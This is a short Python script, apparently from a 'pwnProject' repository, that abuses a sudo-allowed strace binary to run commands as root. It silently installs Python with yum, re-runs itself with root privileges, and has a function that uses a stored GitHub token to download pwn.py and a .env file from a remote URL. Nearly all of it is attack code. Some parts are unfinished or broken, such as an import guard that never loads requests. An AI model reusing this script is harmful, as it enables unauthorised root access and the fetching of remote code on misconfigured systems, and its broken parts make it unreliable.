import os
import subprocess
import sys


scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'
mainUser = 'LivvidDreams'
gtfoBin = 'sudo strace -o /dev/null {}'
files = ['pwn.py', '.env']


def update_python():
    try:
        pyth = 'python3 --version >/dev/null'
        subprocess.call(pyth.split(), stdout = subprocess.PIPE)
        return
    except Exception:
        print('updating python')
        subprocess.call(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null').split(), stdout=subprocess.PIPE)


if sys.version_info.major > 3:
    import requests
    from dotenv import load_dotenv
    



def is_root():
    if os.getuid() == 0:
        print("OBTAINED ROOT")
        return True
    else:
        # Rerun This Script As Root User
        subprocess.call(gtfoBin.format('python3 pwn.py').split())
        exit()



def configureTokens():
    api_key = None
    try:
        load_dotenv()
        api_key = os.getenv("github_key")
    except:
        '''
        os.system("pip install -r requirements.txt")
        '''
        print("NEED TO IMPLEMENT GETTING DEPENDENCIES")
        exit()

    return (mainUser, api_key)



def getScript():
    validAuth = configureTokens()
    if validAuth:
        for file in files:
            save = requests.get(scriptLink + file, auth = validAuth, allow_redirects = True)
            open(file, "wb").write(save.content)
            '''
                Implement Directory to Save These Files To
            '''
    else:
        exit()


def main():
    # Obtain Root Priv To Run Rest Of Script With

    # Check If Script Is Already In Directory, Else Get Script
    #getScript()

    # First Attempt To Install Python3 for Easier Scripting
    update_python()

    # Next Attempt To Rerun Script As Root. Else, Run Root Priv Things
    if not is_root(): exit()
    
    
    




if __name__ == "__main__":
    main()